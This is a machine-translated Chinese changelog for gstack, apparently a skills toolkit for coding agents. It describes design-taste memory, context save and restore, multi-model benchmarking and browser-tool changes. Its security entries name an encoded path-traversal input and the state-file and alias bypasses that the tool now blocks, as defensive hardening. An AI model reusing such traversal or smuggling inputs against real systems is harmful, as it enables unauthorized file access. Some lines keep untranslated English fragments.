make-pdf shells 为 Chromium 生命周期的 `browse` 。没有第二个 Playwright 安装，没有第二个 58MB 二进制文件，没有第二个代码设计舞蹈。 `$B pdf` 从“以 A4 格式截屏”成长为一个真正的 PDF 引擎，具有 `--format`/`--width`/`--height`、`--margins`、`--header-template`/`--footer-template`、`--page-numbers`、`--tagged`、`--outline`、`--toc`、`--tab-id` 和 `--from-file`，适用于大负载（Windows argv上限）。 `$B load-html` 和 `$B js` 也得到 `--tab-id` ，因此并行 `$P generate` 调用永远不会在活动选项卡上竞争。 `$B newtab --json` 返回结构化输出，因此 make-pdf 可以解析选项卡 ID，而无需正则表达式匹配日志字符串。

### 对于贡献者

- 技能文件：`make-pdf/SKILL.md.tmpl`。二进制源：`make-pdf/src/`。测试夹具：`make-pdf/test/fixtures/`。 CI 工作流程：`.github/workflows/make-pdf-gate.yml`。
- 新解析器 `{{MAKE_PDF_SETUP}}` 发出 `$P=` 别名，其发现顺序与 `$B` 相同：`MAKE_PDF_BIN` env 覆盖，然后是本地技能根，然后是全局安装，然后是 PATH。
- 组合功能复制粘贴门是 `make-pdf/test/e2e/combined-gate.test.ts` 中的 P0 测试。每个功能门都是 P1 诊断。
- 第 4 阶段延期：供应的 Paged.js 用于准确的 TOC 页码，供应的highlight.js 用于语法突出显示、首字下沉、引述、CMYK 安全转换、两列布局。
- 序言 bash 现在发出 `_EXPLAIN_LEVEL` 和 `_QUESTION_TUNING` ，以便下游技能可以在运行时读取它们。黄金档赛程已更新以匹配。

## [1.3.0.0] - 2026-04-19

## **你的设计技巧会影响你的品味。**
## **您的会话状态成为您可以 grep 的文件，而不是黑匣子。**

v1.3 是关于你每天做的事情。 `/design-shotgun` 现在会记住您在各个会话中批准的字体、颜色和布局，因此下一轮的变体会倾向于您的实际品味，而不是每次都重置为 Inter。 `/design-consultation` 有一个“人类设计师会因此感到尴尬吗？”第五阶段的自我门以及“人们会记住的一件事是什么？”在第一阶段强制提出问题，AI-slop 输出在到达你之前就被丢弃了。 `/context-save` 和 `/context-restore` 将会话状态写入 `~/.gstack/projects/$SLUG/checkpoints/` 中的明文 Markdown，您可以在机器之间读取、编辑和移动。打开连续检查点模式（`gstack-config set checkpoint_mode continuous`），它还会将带有结构化 `[gstack-context]` 主体的 `WIP:` 提交放入 git 日志中。 Claude Code 已经管理自己的会话状态，这是您控制的并行轨道，采用您自己的格式。

### 重要的数字

设置：这些来自 v1.3 功能面。可通过模式的 `grep "Generate a different" design-shotgun/SKILL.md.tmpl`、`ls model-overlays/`、`cat bin/gstack-taste-update` 和运行时连接的 `gstack-config get checkpoint_mode` 进行重现。

|公制|v1.3 之前|v1.3之后| Δ           |
|--------------------------------------------------|------------------------------|-----------------------------------------|-------------|
|**设计变体收敛门**|没有要求|**需要 3 个轴**（字体 + 调色板 + 布局必须不同）| **+3**  |
|**AI-slop字体黑名单**|~8 种字体|**10+**（添加了 Space Grotesk、system-ui 作为主要）| **+2+** |
|**在 `/design-shotgun` 轮中品尝记忆**|没有任何|**每个项目 JSON，5%/wk 衰减**|**新的**|
|**会话状态格式**|Claude Code 的不透明会话存储|**默认情况下使用 `~/.gstack/` 进行降价，如果您选择连续模式，则加上 `WIP:` git 提交**（并行轨道）|**新的**|
|**`/context-restore` 来源**|仅限 Markdown 文件|**来自 WIP 提交的 markdown + `[gstack-context]`**| **+1** |
|**具有行为叠加的模型**|1（已关闭）|**5**（克劳德、gpt、gpt-5.4、gemini、o 系列）| **+4** |

最引人注目的一行：会话状态不再是黑匣子。 Claude Code 的内置会话管理以其自身的方式工作得很好，但你不能 `grep` 它，你不能读取它，你不能将它交给不同的工具。 `/context-save` 将 markdown 写入 `~/.gstack/projects/$SLUG/checkpoints/`，您可以在任何编辑器中打开。连续模式（选择加入）还会将带有结构化 `[gstack-context]` 主体的 `WIP:` 提交放入 git 日志中，因此 `git log --grep "WIP:"` 显示整个线程。无论哪种方式，纯文本都是您拥有的，而不是专有商店。

### 这对 gstack 用户意味着什么

如果您是一位单独的构建者或创始人，每次只在一个冲刺中交付产品，`/design-shotgun` 将不再每次都向您提供相同的四个变体，而是开始了解您选择哪些变体。 `/design-consultation` 停止默认 Inter + 灰色 + 圆角，并强迫自己回答“什么是令人难忘的？”在它完成之前。 `/context-save` 和 `/context-restore` 为您提供并行的、可检查的会话状态记录，默认情况下，它与 Claude Code 自己的 markdown 文件一起存在于您的主目录中，如果您选择连续模式，还可以加上 git 提交。当您需要将工作交给不同的工具或只是查看代理实际决定的内容时，您可以打开文件或读取 `git log`。运行 `/gstack-upgrade`，在下一个着陆页上尝试 `/design-shotgun`，并批准一个变体，以便品味引擎有一个启动信号。

### 逐项变更

### 额外

#### 不再像人工智能的设计技能

- **防倾斜设计限制。** `/design-consultation` 现在询问“人们会记住的一件事是什么？”作为第一阶段的一个强制问题，并提出“人类设计师会因此感到尴尬吗？”第 5 阶段的自选门 - 未通过选通门的输出将被丢弃并重新生成。 `/design-shotgun` 获得反收敛指令：每个变体必须使用不同的字体、调色板和布局，否则其中一个会失败。 Space Grotesk（新的“Inter 的安全替代品”）已添加到过度使用的字体列表中。 `system-ui` 作为主要字体添加到 AI-slop 黑名单中。
- **设计品味引擎。** 您在 `/design-shotgun` 中的批准和拒绝将被写入到 `~/.gstack/projects/$SLUG/taste-profile.json` 中的持久的每个项目品味配置文件中。通过拉普拉斯平滑置信度跟踪字体、颜色、布局和美学方向。每周衰减 5%，因此陈旧的偏好会消失。 `/design-consultation` 和 `/design-shotgun` 都会影响您对未来运行的偏好，因此本月的变体 #3 会记住您上个月在变体 #1 中喜欢的内容。

#### 您可以查看、grep 和移动的会话状态

- **连续检查点模式（选择加入，默认为本地）。** 使用 `gstack-config set checkpoint_mode continuous` 打开它，技能会自动将带有 `WIP: <description>` 前缀和结构化 `[gstack-context]` 正文（做出的决策、剩余工作、失败的方法）的工作直接提交到项目的 git 日志中。与 Claude Code 的内置会话管理以及 `~/.gstack/` 中的默认 `/context-save` markdown 文件一起运行。当您希望 `git log --grep "WIP:"` 显示分支上的整个推理线程，或者当您想在不打开文件的情况下查看代理所做的事情时，基于 git 的跟踪非常有用。推送是通过 `checkpoint_push=true` 选择加入的，默认情况下仅限本地，因此您不会在每次 WIP 提交时意外触发 CI。
- **`/context-restore` 读取 WIP 提交。** 除了 Markdown 保存的上下文文件之外，`/context-restore` 现在还解析当前分支上 WIP 提交的 `[gstack-context]` 块。当您想要从上次停下来的地方继续进行结构化决策并查看剩余工作时，它就在那里。
- **`/ship` 在创建 PR 之前非破坏性地压缩 WIP 提交**。仅使用 `git rebase --autosquash` 范围用于 WIP 提交。分支上的非 WIP 提交将被保留。在与 `BLOCKED` 状态发生冲突时中止，而不是破坏实际工作。因此，您可以在整个星期疯狂地进行 `WIP:` 提交，并且仍然发布一个干净的可平分 PR。

#### 生活品质

- **升级后出现功能发现提示。** 当 `JUST_UPGRADED` 触发时，gstack 会为每个用户启用一次新功能（每个功能标记文件位于 `~/.gstack/.feature-prompted-{name}`）。在生成的会话中完全跳过。不再有永远不会被发现的静默功能。
- **上下文健康软指令（T2+ 技能）。** 在长时间运行的技能（`/qa`、`/investigate`、`/cso`）期间，gstack 现在会促使您编写定期的 `[PROGRESS]` 摘要。如果您发现自己在原地踏步，请停下来重新评估。自我监控 50 多个工具调用会话。没有虚假门槛，没有强制执行。进度报告永远不会改变 git 状态。

#### 跨主机支持

- **通过 `--model` 标志实现每个模型的行为覆盖。** 不同的法学硕士需要不同的推动。运行 `bun run gen:skill-docs --model gpt-5.4` ，每个生成的技能都会获得 GPT 调整的行为补丁。 `model-overlays/` 中提供了五个覆盖层：claude（待办事项列表规则）、gpt（反终止+完整性）、gpt-5.4（反冗长，继承 gpt）、gemini（简洁）、o-series（结构化输出）。覆盖文件是纯 Markdown - 就地编辑，无需更改代码。 `MODEL_OVERLAY: {model}` 在前导码输出中打印，以便您知道哪一个处于活动状态。

#### 配置

- **`gstack-config list` 和 `defaults`** 子命令。 `list` 显示具有当前值和源的所有配置键（用户设置与默认值）。 `defaults` 显示默认表。修复了先前的差距，其中 `get` 由于缺少键而返回空，而不是回退到记录的默认值。
- **`checkpoint_mode` 和 `checkpoint_push` 配置键。** 用于连续检查点模式的新旋钮。两者都默认为安全值（`explicit` 模式，无自动推送）。

#### 高级用户/内部

- **`gstack-model-benchmark` CLI + `/benchmark-models` 技能。** 在 Claude、GPT（通过 Codex CLI）和 Gemini 上并行运行相同的提示。通过 Anthropic SDK 判断器比较延迟、令牌、成本和可选的输出质量（`--judge`，~$0.05/run）。每个提供商的身份验证检测、定价表、工具兼容性图、并行执行、每个提供商的错误隔离。输出为表/JSON/markdown。 `--dry-run` 验证标志 + 身份验证，无需花费 API 调用。 `/benchmark-models` 将 CLI 包装在交互式流程中（选择提示 → 确认提供程序 → 决定判断 → 运行 → 解释），当您想使用数据而不是振动来了解“哪种模型实际上最适合我的 `/qa` 技能”时。

### 改变了

- **前导码分为子模块。** `scripts/resolvers/preamble.ts` 有 740 行，有 18 个内联生成器。现在它是一个约 100 行的组合根，从 `scripts/resolvers/preamble/*.ts` 导入每个生成器。输出是字节相同的（在重构之前和之后在所有主机上生成的所有 135 个 SKILL.md 文件上通过 `diff -r` 进行验证）。维护变得更容易：添加新的序言部分现在是“创建一个文件，添加一个导入行”，而不是“在上帝文件中查找一个位置”。这也吸收了 main 的 v1.1.2 模式姿势和 v1.0 编写风格添加作为子模块（`generate-writing-style.ts`、`generate-writing-style-migration.ts`）。
- **删除了防溢出死代码。** `scripts/gen-skill-docs.ts` 具有 `AI_SLOP_BLACKLIST`、`OPENAI_HARD_REJECTIONS` 和 `OPENAI_LITMUS_CHECKS` 的重复副本。已删除 — `scripts/resolvers/constants.ts` 现在是单一来源。不再有漂移风险。
- **令牌上限从 25K 提高到 40K。** 合法打包大量行为（`/ship`、`/plan-ceo-review`、`/office-hours`）的技能会引发警告，鉴于当今的 200K-1M 上下文窗口和提示缓存，这些警告不再反映真正的风险。 CLAUDE.md 的指导将上限重新定义为“注意失控增长”信号，而不是强制压缩目标。

### 固定的

- **Codex 适配器在临时工作目录中工作。** GPT 适配器（通过 `codex exec`）现在通过 `--skip-git-repo-check`，因此在非 git 临时目录中运行的基准测试不会出现“不在受信任目录内”错误。 `-s read-only` 保持安全边界；该标志仅跳过交互式信任提示。
- **`--models` 列表重复数据删除。** 传递 `--models claude,claude,gpt` 不再运行克劳德两次和双重账单。标志解析器通过 Set 进行重复数据删除，同时保留首次出现的顺序。
- **CI Docker 在 Ubicloud 运行器上构建。** 在分支生命周期中合并了两个修复：(1) 将 Node.js 安装从 NodeSource apt 切换为直接下载官方的 nodejs.org tarball，因为 Ubicloud 运行器经常无法访问 archive.ubuntu.com / security.ubuntu.com； (2) 将 `xz-utils` 添加到系统 deps，以便 `.tar.xz` tarball 上的 `tar -xJ` 实际上可以工作。

### 对于贡献者

- **用于多提供商基准测试的测试基础设施。** `test/helpers/providers/{types,claude,gpt,gemini}.ts` 定义了一个统一的 `ProviderAdapter` 接口和三个包装现有 CLI 运行程序的适配器。 `test/helpers/pricing.ts` 有每个模型的成本表（每季度更新）。 `test/helpers/tool-map.ts` 声明每个提供商的 CLI 公开哪些工具 - 需要 Edit/Glob/Grep 正确跳过 Gemini 并报告 `unsupported_tool` 的基准。
- **中性 `scripts/models.ts` 中的模型分类。** 避免通过 `hosts/index.ts` 进行导入循环，如果 `Model` 存在于 `scripts/resolvers/types.ts` 中，则会发生这种情况。 `resolveModel()` 处理族启发式：`gpt-5.4-mini` → `gpt-5.4`、`o3` → `o-series`、`claude-opus-4-7` → `claude`。
- **`scripts/resolvers/preamble/`** — 18 个单一用途生成器，每个生成器 16-160 行。 `scripts/resolvers/preamble.ts` 中的组合根导入它们并将它们连接到层门控部分列表中。
- **计划和审查仍然存在。** 实施遵循 `~/.claude/plans/declarative-riding-cook.md`，经过了 CEO 审查（范围扩展，接受了 6 个扩展）、DX 审查（POLISH，修复了 5 个差距）、工程审查（4 个架构问题）和法典审查（11 个残酷的发现，全部整合，2 个先前的决定被推翻）。
- **写作风格规则 2-4 中的模式-姿势能量**（从 main 的 v1.1.2.0 移植）。规则 2 和规则 4 现在涵盖三个框架——减轻疼痛、解锁能力、强制问题压力——因此扩展、构建和强制问题技能保持其优势，而不是陷入诊断疼痛框架。规则 3 为堆叠强迫问题添加了明确的例外。通过合并进来​​；位于 v1.3 中已提供的子模块重构之上。
- **v1.3 原语的 Lite E2E 覆盖率。** 三个新测试文件填补了初步审查中标记的实际覆盖率差距：`test/taste-engine.test.ts`（24 个测试 - 模式形状、拉普拉斯平滑置信度、5%/week 衰减钳制在 0、多维提取、不区分大小写的第一个外壳获胜策略、通过种子然后一次调用的会话上限、遗留配置文件迁移、品味漂移冲突警告，格式错误的 JSON 恢复）、`test/benchmark-cli.test.ts`（12 个测试 — CLI 标志连接、提供程序默认值、未知提供程序 WARN 路径、剥离身份验证环境变量的 NOT-READY 分支回归捕获器）、`test/skill-e2e-benchmark-providers.test.ts`（8 个定期层实时 API 测试 — 通过 claude/codex/gemini 适配器进行简单的“echo ok”提示、解析输出 + 令牌 + 成本 + 超时错误代码的断言+ Promise.allSettled 并行隔离）。
- **为三个主机提供黄金装置。** `test/fixtures/golden/{claude,codex,factory}-ship-SKILL.md` — `/ship` 生成的输出上的字节精确回归引脚。 /review 期间的对抗性子代理传递在合并之前捕获了两个真正的错误：口味引擎中的 Geist/GEIST 大小写策略已取消固定，并且实时 E2E 工作目录是在模块加载时创建的，并且从未清理过。

## [1.1.3.0] - 2026-04-19

### 改变了
- **`/checkpoint` 现在是 `/context-save` + `/context-restore`。** Claude Code 将 `/checkpoint` 视为当前环境中的本机倒带别名，这会影响 gstack 技能。症状：您输入 `/checkpoint`，代理会将其描述为“您需要直接输入的内置内容”，并且不会保存任何内容。修复方法是彻底重命名并分成两个技能。一种可以拯救，一种可以恢复。您的旧保存文件仍通过 `/context-restore` 加载（​​存储路径不变）。
- `/context-save` 保存您当前的工作状态（可选标题：`/context-save wintermute`）。
- `/context-save list` 列出已保存的上下文。默认为当前分支；为每个分支传递 `--all` 。
- `/context-restore` 默认加载所有分支中最近保存的上下文。这修复了第二个错误，即旧的 `/checkpoint resume` 流与列表流过滤交叉污染并默默地隐藏您最近的保存。
- `/context-restore <title-fragment>` 加载特定的已保存上下文。
- **恢复顺序现在是确定性的。**“最近”是指文件名中的 `YYYYMMDD-HHMMSS` 前缀，而不是文件系统 mtime。复制和 rsync 期间 mtime 发生漂移；文件名则不然。适用于恢复和列表流。

### 固定的
- **macOS 上的空集错误。** 如果您在保存的文件为零的情况下运行 `/checkpoint resume`（现在为 `/context-restore`），“查找...|xargs ls -1t` would fall back to listing your current directory. Confusing output, no clean "no saved contexts yet" message. Replaced with `find|排序-r|head`，因此空输入保持为空。

### 对于贡献者
- 新的 `gstack-upgrade/migrations/v1.1.3.0.sh` 删除了过时的磁盘上 `/checkpoint` 安装，因此 Claude Code 的本机 `/rewind` 别名不再受到隐藏。跨三个安装形状（符号链接到 gstack 的目录、符号链接到 gstack 的带有 SKILL.md 的目录，以及其他任何东西）进行所有权保护。用户拥有的 `/checkpoint` 技能保留并带有通知。经过对抗性审查后，迁移得到强化：显式 `HOME` unset/empty 防护、带有 python3 回退的 `realpath`、`rm --` 标志、macOS sidecar 处理。
- `test/migration-checkpoint-ownership.test.ts` 提供 7 个场景，涵盖所有 3 个安装形状 + 幂等性 + 未安装 gstack 时无操作 + SKILL.md-symlink-outside-gstack。免费套餐，~85 毫秒。
- 将 `checkpoint-save-resume` E2E 拆分为 `context-save-writes-file` 和 `context-restore-loads-latest`。后者使用扰乱的 mtime 播种两个文件，因此“文件名前缀，而不是 mtime”保证被锁定。
- `context-save` 现在清理 bash 中的标题（允许列表 `[a-z0-9.-]`，上限 60 个字符），而不是信任 LLM 端的 slugification，并在同一秒冲突上附加随机后缀以强制执行仅附加合同。
- `context-restore` 将其文件名列表限制为 20 个最新条目，这样保存了 10k 以上文件的用户就不会破坏上下文窗口。
- `test/skill-e2e-autoplan-dual-voice.test.ts` 在主系统上损坏（错误的 `runSkillTest` 选项名称、错误的结果字段访问、错误的帮助程序签名、缺少 Agent/Skill 工具）。固定端到端：第一次尝试 1/1 通过，0.68 美元，211 秒。语音检测正则表达式现在匹配 JSON 形状的 tool_use 条目和阶段完成标记，而不是裸露的提示文本提及。
- 在 `test/skill-e2e-context-skills.test.ts` 中添加了 8 个实时 E2E 测试，这些测试在启用技能工具的情况下生成 `claude -p` 并在路由路径上断言，而不是手动输入部分提示。涵盖：保存路由、保存然后恢复往返、片段匹配恢复、空状态优雅消息、`/context-restore list` 委托到 `/context-save list`、旧文件兼容、分支过滤器默认值和 `--all` 标志。 `test/context-save-hardening.test.ts` 中的 21 个额外的免费层强化测试固定了标题清理程序白名单、碰撞安全文件名、空集回退和迁移 HOME 防护。
- 新的 `test/skill-collision-sentinel.test.ts` — 针对上游斜杠命令阴影的保险策略。枚举每个 gstack 技能名称，并根据每个主机的已知内置斜线命令列表进行交叉检查（到目前为止已跟踪 23 个 Claude Code 内置命令）。当主机发布新的内置程序时，将其添加到 `KNOWN_BUILTINS` 中，测试会在用户找到它之前标记冲突。 `/review` 与 `KNOWN_COLLISIONS_TOLERATED` 中记录的 Claude Code 的 `/review` 发生冲突，并有书面理由；例外列表在每次运行时都会根据实时技能进行验证，因此过时的条目会失败。
- `test/helpers/session-runner.ts` 中的 `runSkillTest` 现在接受 `env:` 选项用于每个测试环境覆盖。防止测试必须将 `GSTACK_HOME=...` 填充到提示中，这会导致代理绕过技能工具。所有 8 个新的 E2E 测试均使用 `env: { GSTACK_HOME: gstackHome }`。

## [1.1.2.0] - 2026-04-19

### 固定的
- **`/plan-ceo-review` 范围扩展模式保持广泛。** 如果您要求首席执行官审查要有远大的梦想，那么提案就会被分解为干巴巴的功能项目符号（“添加实时通知。将保留率提高 Y%”）。 V1 写作风格规则将每个结果引导到诊断疼痛框架中。共同序言中的规则 2 和规则 4 现在涵盖三个框架：减轻疼痛、释放能力和强制问题压力。大教堂语言在清晰度层中幸存下来。要求 10 倍视力，就得到一个。
- **`/office-hours` 保持其优势。** 启动模式 Q3（绝望的特异性）不再陷入“谁是你的目标用户？”现在，迫在眉睫的问题带来了三个压力，与这个想法的领域相匹配——对 B2B 的职业影响、消费者的日常痛苦、为爱好和开源而解锁的周末项目。建造者模式仍然很狂野：“如果你也……”会出现重复段和相邻的解锁内容，而不是 PRD 语音功能路线图。

### 额外
- **门层评估测试捕获每个 PR 的模式姿态回归。** 当共享序言、计划首席执行官审查模板或办公时间模板发生更改时，将触发三个新的 E2E 测试。 Sonnet 评委在两个轴上对每种模式进行评分：扩张时的感受体验与决策保留、强制的叠加压力与领域匹配结果、构建者的意外组合与兴奋过度优化。最初的 V1 回归发布是因为没有任何东西捕获它。这缩小了这一差距。

### 对于贡献者
- 在 `scripts/resolvers/preamble.ts` 中编写样式规则 2 和规则 4 各提供三个配对的框架示例，而不是一个。规则 3 为堆叠强迫问题添加了明确的例外。
- `plan-ceo-review/SKILL.md.tmpl` 获得由 SCOPE EXPANSION 和 SELECTIVE EXPANSION 共享的新 `### 0D-prelude. Expansion Framing` 小节。
- `office-hours/SKILL.md.tmpl` 获取内联强制范例（Q3）和野生范例（构建器操作原理）。由稳定的标题而不是行号锚定。
- `test/helpers/llm-judge.ts` 中的新 `judgePosture(mode, text)` 助手（十四行诗判断，每种模式双轴标题）。
- `test/fixtures/mode-posture/` 中的三个测试装置 — 扩展计划、强制间距、建造者想法。
- 在 `E2E_TOUCHFILES` + `E2E_TIERS` 中注册的三个条目：`plan-ceo-review-expansion-energy`、`office-hours-forcing-energy`、`office-hours-builder-wildness` — 均为 `gate` 层。
- 回顾该分支的历史：CEO 审查（HOLD SCOPE）+ Codex 计划审查（30 个发现，推动方法从“添加新规则#5 分类法”转向“重写规则 2-4 示例”）。一次工程审查通过了测试基础设施目标（最初指向 `test/skill-llm-eval.test.ts`，它进行静态分析 - 实际上需要 E2E）。

## [1.1.1.0] - 2026-04-18

### 固定的
- **`/ship` 不再默默地让 `VERSION` 和 `package.json` 漂移。** 在此修复之前，`/ship` 的步骤 12 仅读取并碰撞 `VERSION` 文件。任何读取 `package.json` （注册表 UI、`bun pm view`、`npm publish`、未来助手）的下游消费者都会看到过时的 semver，并且由于幂等性检查仅针对 `VERSION` 进行，因此下一次 `/ship` 运行无法检测到它已经发生了漂移。现在，第 12 步分为四种状态 - FRESH、ALREADY_BUMPED、DRIFT_STALE_PKG、DRIFT_UNEXPECTED - 检测各个方向的漂移，通过无法双碰撞的仅同步路径修复它，并在 `VERSION` 和 `package.json` 以不明确的方式不一致时大声停止。
- **针对格式错误的版本字符串进行了强化。** `NEW_VERSION` 在任何写入之前都会根据 4 位 semver 模式进行验证，并且漂移修复路径在将 `VERSION` 内容传播到 `package.json` 之前对它们应用相同的检查。两个文件读取中都会删除尾随回车符和空格。如果 `package.json` 是无效的 JSON，`/ship` 会大声停止，而不是默默地重写损坏的文件。

### 对于贡献者
- `test/ship-version-sync.test.ts` 处的新测试文件 — 14 个案例，涵盖新 Step 12 逻辑的每个分支，包括关键的无双碰撞路径（漂移修复绝不能调用正常碰撞操作）、尾随 CR 回归和无效 semver 修复拒绝。
- 审查此修复的历史记录：一轮 `/plan-eng-review`、一轮 `/codex` 计划审查（在原始设计中发现双凸点错误）、一轮 Claude 对抗子代理（发现 CRLF 处理差距和未经验证的 `REPAIR_VERSION`）。所有出现的问题都在分支机构内应用。

## [1.1.0.0] - 2026-04-18

### 额外
- **浏览现在可以在没有 HTTP 服务器的情况下呈现本地 HTML。** 两种方式：`$B goto file:///tmp/report.html` 导航到本地文件（包括 cwd 相对 `file://./x` 和 home 相对 `file://~/x` 形式，智能解析，因此您不必考虑 URL 语法），或 `$B load-html /tmp/tweet.html` 读取文件并通过 `page.setContent()` 加载它。为了安全起见，两者的范围都为 cwd + temp dir。如果您要迁移在内存中生成 HTML 的 Puppeteer 脚本，这会终止您的 Python-HTTP-服务器解决方法。
- **带有显式标志的元素屏幕截图。** `$B screenshot out.png --selector .card` 现在是对单个元素进行屏幕截图的明确方式。位置选择器仍然有效，但像 `button` 这样的标签选择器无法按位置识别，因此标志形式修复了这个问题。 `--selector` 与 `--base64` 组合并拒绝 `--clip`（选择一项）。
- **通过 `--scale` 进行视网膜屏幕截图。** `$B viewport 480x2000 --scale 2` 设置 `deviceScaleFactor: 2` 并生成像素加倍的屏幕截图。 `$B viewport --scale 2` 仅更改比例因子并保持当前大小。规模上限为 1-3（gstack 策略）。标题模式拒绝该标志，因为比例是由真实的浏览器窗口控制的。
- **加载 HTML 内容在比例变化后仍然存在。** 更改 `--scale` 会重建浏览器上下文（这就是 Playwright 的工作原理），以前会擦除通过 `load-html` 加载的页面。现在，HTML 会在选项卡状态下进行缓存，并自动重播到新的上下文中。仅在内存中；从未持久化到磁盘。
- **Puppeteer → 浏览 SKILL.md 中的备忘单。** 映射到浏览命令的 Puppeteer API 并排表，以及完整的工作示例（推文渲染器流程：视口 + 比例 + 加载 html + 元素屏幕截图）。
- **易于猜测的别名。** 输入 `setcontent` 或 `set-content`，它会路由到 `load-html`。规范化发生在范围检查之前，因此读取范围的令牌不能使用别名来绕过写入范围的强制执行。
- **`Did you mean ...?` 对于未知命令。** `$B load-htm` 返回 `Unknown command: 'load-htm'. Did you mean 'load-html'?`。距离 2 内的编辑匹配，在输入长度 ≥ 4 时进行门控，因此 2 个字母的拼写错误不会产生噪音。
- **`load-html` 上有丰富的、可操作的错误。** 每个拒绝路径（未找到文件、目录、超大、外部安全目录、二进制内容、框架上下文）都会命名输入，解释原因，并说明下一步要做什么。扩展允许列表 `.html/.htm/.xhtml/.svg` + magic-byte sniff（带有 UTF-8 BOM 条带）可在错误重命名的二进制文件呈现为垃圾之前捕获它们。

### 安全
- `file://` 导航现在是 `goto` 中可接受的方案，通过现有的 `validateReadPath()` 策略将范围限定为 cwd + temp dir。 UNC/network 主机 (`file://host.example.com/...`)、IP 主机、IPv6 主机和 Windows 驱动器盘符主机均会被拒绝，并出现显式错误。
- **状态文件不能再走私 HTML 内容。** `state load` 现在对其从磁盘接受的字段使用显式白名单 - 被篡改的状态文件无法注入 `loadedHtml` 来绕过 `load-html` 安全目录、扩展白名单、魔字节嗅探或大小上限检查。通过相同的内存通道在上下文重新创建中保留选项卡所有权，从而缩小了跨代理授权差距，在该差距中，作用域代理可能会在 `viewport --scale` 之后丢失（或获得）选项卡。
- **审核日志现在记录原始别名输入。** 当您键入 `setcontent` 时，审核条目会显示 `cmd: load-html, aliasOf: setcontent`，因此取证跟踪反映了代理实际发送的内容，而不仅仅是规范形式。
- **`load-html` 内容在每次实际导航时正确清除** — 链接点击、表单提交和 JavaScript 重定向现在使重播元数据无效，就像显式 `goto`/`back`/`forward`/`reload` 所做的那样。以前，单击后的 `viewport --scale` 可能会恢复原始 `load-html` 内容（静默数据损坏）。还修复了 SPA 固定 URL：`goto file:///tmp/app.html?route=home#login` 通过规范化保留查询字符串和片段。

### 对于贡献者
- `validateNavigationUrl()` 现在返回规范化 URL（以前无效）。所有四个调用者（goto、diff、newTab、restoreState）均已更新以使用返回值，以便智能解析在每个导航站点上生效。
- 新的 `normalizeFileUrl()` 帮助程序使用 `node:url` 中的 `fileURLToPath()` + `pathToFileURL()` — 绝不是字符串连接 — 因此 URL 转义如 `%20` 可以正确解码，并且编码斜杠遍历 (`%2F..%2F`) 会被 Node 直接拒绝。
- 新的 `TabSession.loadedHtml` 字段 + `setTabContent()` / `getLoadedHtml()` / `clearLoadedHtml()` 方法。源中的 ASCII 生命周期图。 `clear` 调用发生在导航开始之前（而不是之后），因此提交后超时的 goto 不会留下过时的元数据，这些元数据可能会在以后的上下文重新创建时复活。
- `BrowserManager.setDeviceScaleFactor(scale, w, h)` 是原子的：验证输入、存储新值、调用 `recreateContext()`、在失败时回滚字段。 `currentViewport` 跟踪意味着 recreateContext 保留您的大小，而不是硬编码 1280×720。
- `COMMAND_ALIASES` + `canonicalizeCommand()` + `buildUnknownCommandError()` + `NEW_IN_VERSION` 从 `browse/src/commands.ts` 导出。单一事实来源——服务器调度程序和 `chain` 预验证都从同一位置导入。链每步使用 `{ rawName, name }` 形状，因此审核日志会保留用户在调度使用规范名称时键入的内容。
- `load-html` 注册在 `browse/src/token-registry.ts` 的 `SCOPE_WRITE` 中。
- 为好奇者回顾历史：3 次 Codex 咨询（20 + 10 + 6 个间隙）、DX 审查（TTHW ~4 分钟 → <60 秒，冠军级别）、2 次工程审查通过。第三次 Codex 传递捕获了 `validateNavigationUrl` 的 4 个调用者错误，而 eng 传递则错过了该错误。所有的发现都融入到了计划中。

## [1.0.0.0] - 2026-04-18

### 额外
- **v1 提示 = 更简单。** 每项技能的输出（第 2 层及以上）都会在第一次使用时用一句话解释解释技术术语，用结果术语提出问题（“如果...，您的用户会遇到什么问题”而不是“此端点幂等吗？”），并保持句子简短而直接。适合所有人的好作品——不仅仅是非技术人员。工程师也受益。
- **针对高级用户的简洁选择。** `gstack-config set explain_level terse` 将每项技能切换回较旧的、更紧凑的散文风格 - 没有注释，没有结果框架层。二进制开关，贯穿所有技能。
- **精心策划的术语列表。** 回购拥有的列表，包含约 50 个技术术语（幂等、竞争条件、N+1、背压和朋友），位于 `scripts/jargon-list.json`。这些是术语 gstack 的注释。列表中未列出的术语被认为是足够简单的英语。通过 PR 添加条款。
- **自述文件中的真实 LOC 收据。** 将“600,000 多行生产代码”英雄框架替换为计算出的 2013 年与 2026 年逻辑代码更改的按比例倍数，并对公共与私有存储库提出诚实的警告。计算它的脚本位于 `scripts/garry-output-comparison.ts` 并使用 [scc](https://github.com/boyter/scc)。原始 LOC 仍在 `/retro` 输出中作为上下文，只是不再是标题。
- **更智能的 `/retro` 指标。** `/retro` 现在以发布的功能、提交和合并的 PR 为主导 - 接下来添加逻辑 SLOC，原始 LOC 降级为仅上下文。因为十行的良好修复并不比一万行脚手架的运输量少。
- **首次运行时升级提示** 当您升级到此版本时，您运行的第一个技能将询问一次是否要保留新的默认写作风格或使用 `gstack-config set explain_level terse` 恢复 V0 散文。一次性，标志文件门控，不再询问。

### 改变了
- **重新定义自述文件英雄。** 不再有“每天 10K-20K 行”的说法。重点关注已发布的产品+功能+逻辑代码更改的按比例倍数，这是现在人工智能编写大部分代码的诚实指标。重点不在于是谁输入的，而在于发送的内容。
- **重新设计招聘标注。** 将“运送 10K+ LOC/day”替换为“以 AI 编码速度运送真实产品”。

### 对于贡献者
- 新的 `scripts/resolvers/preamble.ts` 写作风格部分，注入 ≥ 2 级技能。与现有的 AskUserQuestion 格式部分组成（格式 = 问题的结构，风格 = 内部内容的散文质量）。行话列表在 `gen-skill-docs` 时间被烘焙到生成的 SKILL.md 散文中 — 零运行时间成本，编辑 JSON 并重新生成。
- `explain_level` 值的新 `bin/gstack-config` 验证。未知值会打印警告并默认为 `default`。带注释的标头记录了新密钥。
- `gstack-upgrade/migrations/v1.0.0.0.sh` 处的新一次性升级迁移，匹配现有的 `v0.15.2.0.sh` / `v0.16.2.0.sh` 模式。标志文件门控。
- 新的吞吐量管道：`scripts/garry-output-comparison.ts`（scc 预检 + 2013 年 + 2026 年作者范围的 SLOC）、`scripts/update-readme-throughput.ts`（读取 JSON，替换 `<!-- GSTACK-THROUGHPUT-PLACEHOLDER -->` 锚点）、`scripts/setup-scc.sh`（仅在运行吞吐量脚本时调用操作系统检测安装程序 — scc 不是 package.json 依赖项）。
- README 中的两串标记模式可防止管道破坏其自身的更新路径：`GSTACK-THROUGHPUT-PLACEHOLDER`（稳定锚点）与 `GSTACK-THROUGHPUT-PENDING`（显式缺失构建标记 CI 拒绝）。
